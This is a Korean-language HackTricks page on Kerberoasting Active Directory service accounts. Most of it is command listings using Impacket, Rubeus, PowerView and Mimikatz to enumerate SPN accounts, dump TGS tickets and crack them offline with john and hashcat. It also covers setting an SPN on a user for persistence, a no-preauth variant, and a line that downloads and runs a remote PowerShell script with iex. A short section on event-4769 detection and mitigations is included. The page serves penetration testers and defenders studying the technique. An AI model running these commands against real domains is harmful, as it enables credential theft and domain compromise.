# Kerberoast

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)를 사용하여 세계에서 가장 **고급 커뮤니티 도구**를 활용한 **워크플로우를 쉽게 구축하고 자동화**하세요.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로에서 영웅까지 AWS 해킹 배우기<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks)와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

## Kerberoast

Kerberoast는 **Active Directory (AD)**에서 **사용자 계정**으로 작동하는 서비스와 관련된 **TGS 티켓** 획득에 초점을 맞춥니다. 이러한 티켓의 암호화는 **사용자 암호**에서 유래한 키를 사용하므로 **오프라인 자격 증명 크래킹**이 가능합니다. 서비스로서의 사용자 계정은 비어 있지 않은 **"ServicePrincipalName"** 속성으로 나타납니다.

**Kerberoasting**을 실행하기 위해서는 **TGS 티켓**을 요청할 수 있는 도메인 계정이 필요하지만, 이 과정은 **특별한 권한**을 요구하지 않으므로 **유효한 도메인 자격 증명**을 가진 누구나 접근할 수 있습니다.

### 주요 포인트:
- **Kerberoasting**은 **AD** 내의 **사용자 계정 서비스**에 대한 **TGS 티켓**을 대상으로 합니다.
- **사용자 암호**에서 유래한 키로 암호화된 티켓은 **오프라인에서 크래킹**될 수 있습니다.
- 서비스는 비어 있지 않은 **ServicePrincipalName**으로 식별됩니다.
- **특별한 권한**이 필요하지 않으며, **유효한 도메인 자격 증명**만 있으면 됩니다.

### **공격**

{% hint style="warning" %}
**Kerberoasting 도구**는 일반적으로 공격을 수행하고 TGS-REQ 요청을 시작할 때 **`RC4 암호화`**를 요청합니다. 이는 **RC4이** [**약하다**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795)는 이유로, Hashcat과 같은 도구를 사용하여 다른 암호화 알고리즘인 AES-128 및 AES-256보다 오프라인에서 쉽게 크래킹할 수 있기 때문입니다.\
RC4 (type 23) 해시는 **`$krb5tgs$23$*`**로 시작하며, AES-256(type 18)은 **`$krb5tgs$18$*`**로 시작합니다.
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
다음은 kerberoastable 사용자의 덤프를 포함한 다중 기능 도구입니다:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Kerberoastable 사용자 열거**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **기법 1: TGS를 요청하고 메모리에서 덤프**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **기법 2: 자동 도구**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
TGS가 요청될 때, Windows 이벤트 `4769 - Kerberos 서비스 티켓이 요청되었습니다`가 생성됩니다.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)를 사용하여 세계에서 가장 **고급**한 커뮤니티 도구를 활용한 **워크플로우를 쉽게 구축**하고 **자동화**할 수 있습니다.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### 크래킹
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### 지속성

사용자에게 **충분한 권한**이 있다면, **kerberoastable**하게 만들 수 있습니다:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
유용한 **도구**로 **kerberoast** 공격을 찾을 수 있습니다: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

만약 Linux에서 다음 **오류**를 발견한다면: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`**, 이는 로컬 시간 때문입니다. 호스트를 도메인 컨트롤러와 동기화해야 합니다. 몇 가지 옵션이 있습니다:

* `ntpdate <DC의 IP>` - Ubuntu 16.04 이후로는 사용되지 않습니다.
* `rdate -n <DC의 IP>`

### 완화

Kerberoasting은 취약하다면 매우 은밀하게 수행될 수 있습니다. 이러한 활동을 감지하기 위해 **보안 이벤트 ID 4769**에 주의해야 합니다. 이 이벤트는 Kerberos 티켓이 요청되었음을 나타냅니다. 그러나 이 이벤트의 빈도가 높기 때문에 의심스러운 활동을 분리하기 위해 특정 필터를 적용해야 합니다:

- 서비스 이름은 **krbtgt**이 아니어야 하며, 이는 정상적인 요청입니다.
- **$**로 끝나는 서비스 이름은 제외되어야 하며, 이는 서비스에 사용되는 기계 계정을 포함하지 않기 위함입니다.
- **machine@domain** 형식으로 된 계정 이름을 제외하여 기계에서의 요청을 걸러야 합니다.
- 오류 코드 **'0x0'**로 식별되는 성공적인 티켓 요청만 고려되어야 합니다.
- 가장 중요한 것은 티켓 암호화 유형이 Kerberoasting 공격에서 자주 사용되는 **0x17**이어야 합니다.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Kerberoasting의 위험을 줄이기 위해 다음을 수행하세요:

- **서비스 계정 비밀번호를 추측하기 어렵게** 설정하고, 길이를 **25자 이상**으로 권장합니다.
- **관리되는 서비스 계정**을 사용하여 보안을 강화할 수 있는 **자동 비밀번호 변경** 및 **위임된 서비스 주체 이름 (SPN) 관리**와 같은 이점을 활용하세요.

이러한 조치를 적용함으로써 조직은 Kerberoasting과 관련된 위험을 크게 줄일 수 있습니다.


## 도메인 계정 없이 Kerberoast

**2022년 9월**, 연구원인 Charlie Clark라는 사람이 [exploit.ph](https://exploit.ph/)라는 플랫폼을 통해 알려진 새로운 시스템 공격 방법을 밝혀냈습니다. 이 방법은 **Active Directory 계정을 제어할 필요 없이** **서비스 티켓 (ST)**을 얻을 수 있게 해주는 **KRB_AS_REQ** 요청을 통해 이루어집니다. 기본적으로, 사전 인증이 필요하지 않은 방식으로 설정된 주체(principal)가 있다면, 사이버 보안 분야에서 알려진 **AS-REP Roasting 공격**과 유사한 시나리오로 이 특성을 이용하여 요청 프로세스를 조작할 수 있습니다. 구체적으로, 요청의 본문 내의 **sname** 속성을 변경함으로써 시스템은 표준 암호화된 Ticket Granting Ticket (TGT) 대신 **ST**를 발급하도록 속일 수 있습니다.

이 기술에 대한 자세한 내용은 다음 글에서 확인할 수 있습니다: [Semperis 블로그 글](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
이 기술을 사용하기 위해서는 유효한 계정을 쿼리하기 위한 LDAP이 없으므로 사용자 목록을 제공해야 합니다.
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py PR #1413](https://github.com/fortra/impacket/pull/1413)에서 가져온 [impacket/GetUserSPNs.py](https://github.com/fortra/impacket/pull/1413) 파일:
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus PR #139에서](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## 참고 자료
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks)와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)를 사용하여 세계에서 가장 고급스러운 커뮤니티 도구를 활용한 **워크플로우를 쉽게 구축하고 자동화**하세요.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
